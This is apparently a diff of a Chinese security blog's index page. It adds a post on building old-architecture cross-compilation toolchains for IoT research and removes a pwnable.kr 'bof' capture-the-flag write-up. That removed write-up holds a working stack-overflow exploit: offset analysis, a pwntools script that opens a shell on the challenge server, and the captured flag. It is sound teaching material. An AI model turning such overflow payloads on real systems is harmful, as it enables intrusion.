@@ -168,6 +168,136 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/12/20/IoT%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E4%B8%AD%E7%9A%84%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A%E7%BB%88%E7%BB%93%E7%AF%87%EF%BC%88100%%E5%8F%AF%E5%A4%8D%E7%8E%B0%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/20/IoT%EF%BF%BDh%14v-%EF%BF%BD%EF%BF%BD%EF%BF%BD%16%D1%AF%EF%BF%BD-%EF%BF%BD%1A%EF%BF%BD%EF%BF%BD%EF%BF%BD%08100%25%EF%BF%BD%0D%EF%BF%BD%09/" class="post-title-link" itemprop="url">IoT安全研究中的交叉编译环境搭建：终结篇</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-12-20 05:23:14" itemprop="dateCreated datePublished" datetime="2023-12-20T05:23:14+08:00">2023-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-22 17:39:51" itemprop="dateModified" datetime="2023-12-22T17:39:51+08:00">2023-12-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在IoT安全研究过程中，有时候我们出于调试或者增加设备功能的目的，需要将程序交叉编译上传到设备中，这个时候就需要构建交叉编译工具链。我曾经尝试过多种构造交叉编译工具链的方法，例如：</p>
+<ul>
+<li>寻找对应架构的Debian虚拟机并使用qemu进行系统级仿真，然后像使用一个正常系统一样进行程序编译</li>
+<li>使用buildroot编译交叉编译工具链</li>
+<li>使用系统源安装相应的交叉编译工具链</li>
+</ul>
+<p>在构造的过程中也踩过很多坑，可以列举一下踩过的比较典型的：</p>
+<ul>
+<li>以mips架构有I、II、III型，网上的Debian虚拟机往往是高版本类型。高版本类型的好处是可以向下兼容，因此很多系统级的仿真可以直接chroot到设备根目录运行程序；但是对于交叉编译的坏处就是没法编译低版本架构的程序</li>
+<li>高版本的buildroot中没有对低版本架构的配置</li>
+<li>同样系统源安装的交叉编译工具链也是没有对低版本架构</li>
+<li>在不同的设备上安装buildroot可能需要解决各种包依赖问题</li>
+</ul>
+<p>这个时候就引出了我的一个需求：如何才能在一个新的工作环境中快速搭建起来一套交叉编译工具链，并且这个交叉编译工具链还能支持较老的低版本架构CPU。</p>
+<p>第一个问题：我参考了Google内核fuzz工具syzkaller中的<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/tools/create-image.sh">create-image.sh</a>，这个脚本基于命令debootstrap，能够快速搭建指定发行版、架构、软件包的一个Debian文件系统镜像。我稍微修改此脚本，得到了一个能够支持某个指定版本的buildroot的文件系统，以后使用的时候直接chroot到根目录，就能愉快构造编译链了 + 交叉编译了。</p>
+<p>第二个问题：我是选择了buildroot-2013.02-rc1作为长期使用的版本，这个版本足够老、支持足够多、足够旧的CPU架构。目前在我的日常使用中来看，已经够用了。</p>
+<p>我在Github上创建了一个仓库，里面是创建文件系统和buildroot的脚本，以及静态编译好的适配各个架构的常用程序，后续持续更新。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/NoneShell/buildrooter">GitHub - NoneShell&#x2F;buildrooter</a></p>
+<h2 id="Debian-wheezy文件系统搭建"><a href="#Debian-wheezy文件系统搭建" class="headerlink" title="Debian wheezy文件系统搭建"></a>Debian wheezy文件系统搭建</h2><p>克隆仓库，然后直接运行create-image.sh，会创建一个Debian wheezy的文件系统：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NoneShell/buildrooter.git</span><br><span class="line"><span class="built_in">cd</span> buildrooter</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>
+
+<p>创建完成后，进入chroot目录，这个就是一个Debian wheezy的文件系统，通过这种方式就可以保证所有的Linux都能以后续相同的操作，得到一个100%能成功编译的环境。<br><img src="/images/image-2023-1220-180603052.png" alt="undifined"></p>
+<p>chroot到目录后，根据个人习惯可以做一些设置，此时已经和正常使用一个Debian系统没有区别了。我会设置好TERM和locales，因为我平常使用tmux，一些命令例如clear会报错tmux-256 colors；locales则是Busybox编译的时候会报错让至少使用一个UTF-8的locale。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
+<h2 id="buildroot编译"><a href="#buildroot编译" class="headerlink" title="buildroot编译"></a>buildroot编译</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://buildroot.org/downloads/buildroot-2013.02-rc1.tar.gz --no-check-certificate</span><br><span class="line">tar -xvf ./buildroot-2013.02-rc1.tar.bz2</span><br></pre></td></tr></table></figure>
+
+<p>我使用的是tmux，例如使用命令clear的时候会报错：<code>&#39;tmux-256color&#39;: unknown terminal type.</code>，可以每次手动设置如下，我选择写入到了.bashrc中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<p>以最近在看的一个目标为例，使用file查看目标的架构如下，mipsel架构，且是version 1，SYSV。目标是编译出来能够在设备上运行的busybox、gdbserver和nc，自己编译的busybox可以使其支持更多的命令，gdbserver是调试必备，nc用来做端口转发、程序运行等。<br><img src="/images/image-2023-1220-181122595.png" alt="undifined"></p>
+<p>首先是编译符合目标架构的交叉编译工具链，进入buildroot目录中，执行<code>make menuconfig</code>，进入配置菜单。</p>
+<p><img src="/images/image-2023-1220-181852438.png" alt="undifined"></p>
+<p>如果仅仅是为了交叉编译工具链，不需要额外设置太多，选择好目标架构、架构版本、ABI是默认O32，然后在Toolchain中选择想要支持的特性即可。有一个地方一定要修改，就是Kernel Header选择Manually specified Linux version，并设置成3.7.1。默认设置是3.7.x，但是在实际make的时候下载不到相应的的Header文件。gdb和gdbserver我没有选择，因为一般是习惯将gdbserver放到设备上运行，然后在本机使用gdb连接进行调试。<br><img src="/images/image-2023-1220-182116071.png" alt="undifined"></p>
+<p>编译交叉编译工具链，只需要执行<code>make toolchain</code>即可，我之前看过很多网上的教程都是直接make，这样会同时编译出来rootfs和kernel，消耗大量时间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make toolchain</span><br></pre></td></tr></table></figure>
+
+<p>编译完成的交叉编译工具链路径在&#x2F;output&#x2F;host&#x2F;usr&#x2F;bin目录中，可以将目录host重命名成<code>host_arch</code>，例如<code>host_LSB_MIPS_MIPS-I_SYSV</code>，这样下次编译新的架构的工具链时，<code>make clean</code>不会删除掉已经编译好的架构的工具链。我的命名习惯是根据file查看的目标程序的信息来重命令文件夹，如下是此次演示的目标架构：<br><img src="/images/image-2023-1221-100243668.png" alt="undifined"></p>
+<p>为了使用方便，可以把工具链的路径添加到PATH环境变量中，写入到.bashrc，后续编译程序的时候，指定CC&#x2F;CXX时就不用输入完整的路径，日常使用的时候也可以在终端tab补全。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/root/buildroot-2013.02-rc1/output/host_LSB_MIPS_MIPS-I_SYSV/usr/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-1221-100555135.png" alt="undifined"></p>
+<h2 id="静态编译实例"><a href="#静态编译实例" class="headerlink" title="静态编译实例"></a>静态编译实例</h2><p>当交叉编译工具链制作完成了，交叉编译自己的程序实际上和正常x86&#x2F;64下的编译没有太大的区别，可能需要踩的坑就是ulibc中的一些系统库缺少需要自己编译并链接、编译版本太新的程序可能会有符号引用报错等，总之就是遇见坑GPT、Google。</p>
+<h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h3><p>buildroot自带的package中就有busybox，编译前先将目标架构的host_target目录复制一份为host目录，这样buildroot才能正确设置编译相关的参数。<br><img src="/images/image-2023-1221-111208699.png" alt="undifined"></p>
+<p>在buildroot根目录使用命令<code>make busybox-menuconfig</code>进行配置，进入busybox的配置菜单设置静态链接：</p>
+<ul>
+<li>Busybox Settings -&gt; Build Options -&gt; Build Busybox as a static binary，选择静态编译。</li>
+<li>CFLAGS和LDFLAGS都添加上-s，编译后strip掉符号，减少存储占用。</li>
+<li>在Applets区域选择需要额外增加的功能&#x2F;命令，例如我会额外勾选上网络相关的nc、ftpd、telnetd，进程相关的pstree，总之根据个人习惯和需求添加。</li>
+</ul>
+<p><img src="/images/image-2023-1221-110713337.png" alt="undifined"></p>
+<p>然后<code>make busybox</code>即可编译出来静态链接、去除掉符号、增加了额外命令的Busybox，路径：<code>/output/target/busybox</code>。<br><img src="/images/image-2023-1221-111458872.png" alt="undifined"></p>
+<h3 id="gdbserver"><a href="#gdbserver" class="headerlink" title="gdbserver"></a>gdbserver</h3><p>没有编译gdb有两个原因，第一个是因为平常调试的时候一般是将gdbserver复制到设备上，然后本机使用gdb remote进行调试；第二个原因是，gdb交叉编译太多坑了，我各种配置都没有成功，最后选择了放弃（shame on me）。</p>
+<p>下载源码，我选择的版本是7.12，这个版本不需要额外编译termcap库而是使用了较新的ncurses库，这样可以减少额外的编译工作量。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/gdb/gdb-7.12.tar.gz --no-check-certificate</span><br><span class="line">tar -xvf gdb-7.12.tar.gz</span><br><span class="line"><span class="built_in">cd</span> gdb-7.12/gdb/gdbserver <span class="comment"># 进入gdbserver的代码目录</span></span><br><span class="line">sed -i -e <span class="string">&#x27;s/srv_linux_thread_db=yes//&#x27;</span> configure.srv</span><br><span class="line">./configure --target=mipsel-linux --host=mipsel-linux</span><br><span class="line">make CXXFLAGS=<span class="string">&quot;-fPIC -static -lpthread -s&quot;</span></span><br></pre></td></tr></table></figure>
+<p>编译完成如下：<br><img src="/images/image-2023-1221-114051381.png" alt="undifined"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过创建Debian wheezy文件系统 + chroot的方式，可以忽略宿主机的版本问题；buildroot采用较老版本，这样可以支持更多较旧的CPU型号，尤其是MIPS。</p>
+<p>在编译复杂程序的时候，还是可能会踩坑，例如buildroot编译出来的工具链的系统库中没有程序编译依赖的库。总之，只是大概解决了交叉编译问题，实际上最好的解决方案是拿到官方的SDK（我在说什么？？？）。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/12/11/minicom%E7%9A%84%E4%BD%BF%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1204,129 +1334,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/09/14/[pwnable]%20bof/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/14/%5Bpwnable%5D%20bof/" class="post-title-link" itemprop="url">[pwnable.kr] bof</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-09-14 05:51:27" itemprop="dateCreated datePublished" datetime="2023-09-14T05:51:27+08:00">2023-09-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-09-20 11:29:52" itemprop="dateModified" datetime="2023-09-20T11:29:52+08:00">2023-09-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>Nana told me that buffer overflow is one of the most common software vulnerability. </p>
-<p>Is that true?</p>
-<p>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a><br>Download : <a target="_blank" rel="noopener" href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p>
-<p>Running at : nc pwnable.kr 9000</p>
-</blockquote>
-<p>终于到了溢出类的题目了，一道很简单的缓冲区溢出，覆盖变量为指定值。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法1 根据两个变量起始地址差距计算</strong></p>
-<ol>
-<li><p>定位输入字符串的起始地址为：0xffffd1fc</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x5655564f &lt;func+35&gt;    call   gets                    &lt;gets&gt;</span><br><span class="line">       arg[0]: 0xffffd1fc ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">       arg[1]: 0x20</span><br><span class="line">       arg[2]: 0x0</span><br><span class="line">       arg[3]: 0xffffd3cc ◂— 0x20 /* &#x27; &#x27; */</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>定位key比较时，key所在的地址：0xffffd228 + 8 &#x3D; 0xffffd230</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► 0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>
-
-<p>所以如果想要覆盖到key的话，需要先填充0xffffd230 - 0xffffd1fc &#x3D; 0x34个字节；</p>
-<p><strong>方法2 gdb查看内存布局</strong></p>
-<p>调试的时候随便输入一个字符串例如AAAA，然后查看栈内存中AAAA和0xdeadbeef的距离</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/50wx $esp</span><br><span class="line">0xffffd1e0:     0xffffd1fc      0x00000020      0x00000000      0xffffd3cc</span><br><span class="line">0xffffd1f0:     0x00000000      0x00000000      0x01000000      0x41414141</span><br><span class="line">0xffffd200:     0xf7fc4500      0x00000000      0xf7c184be      0xf7e2a054</span><br><span class="line">0xffffd210:     0xf7fbe4a0      0xf7fd6f80      0xf7c184be      0xc823bd00</span><br><span class="line">0xffffd220:     0xffffd260      0xf7fbe66c      0xffffd248      0x5655569f</span><br><span class="line">0xffffd230:     0xdeadbeef      0x00000000      0xf7e2a000      0xf7d20ecb</span><br></pre></td></tr></table></figure>
-
-<p>或者使用gdb的find命令，在指定栈内存范围内搜索字符串起始地址和key地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; find $esp, $esp + 200, &quot;AAAA&quot;</span><br><span class="line">0xffffd1fc</span><br><span class="line">1 pattern found.</span><br><span class="line">pwndbg&gt; find $esp, $esp + 200, 0xdeadbeef</span><br><span class="line">0xffffd230</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure>
-
-<p>0xffffd230 - 0xffffd1fc &#x3D; 0x34</p>
-<p><strong>方法3 常识</strong></p>
-<p>x86情况下，ebp存放上一个栈帧的ebp，ebp + 4是存放的返回地址，ebp + 8是第一个参数的地址、ebp + 12是第二个参数的地址，依次。key是第一个参数。</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那么逻辑就比较清晰了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import sys; sys.stdout.buffer.write(b&#x27;A&#x27; * 52 + b&#x27;\xbe\xba\xfe\xca&#x27;)&quot; &gt; ./payload</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">52</span> + <span class="string">b&#x27;\xbe\xba\xfe\xca&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9000: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof</span><br><span class="line">bof.c</span><br><span class="line">flag</span><br><span class="line">log</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">daddy, I just pwned a buFFer :)</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
-
-<h2 id="知识点小结"><a href="#知识点小结" class="headerlink" title="知识点小结"></a>知识点小结</h2><ol>
-<li>gdb搜索内存</li>
-</ol>
-<p>使用命令find来搜索内存中特定的值，语法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find start_address, end_address, value</span><br></pre></td></tr></table></figure>
-<p>如果要搜索整个内存空间，使用0和-1作为起始地址和结束地址。</p>
-<ol start="2">
-<li>x86下32为的内存空间布局</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1396,7 +1403,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
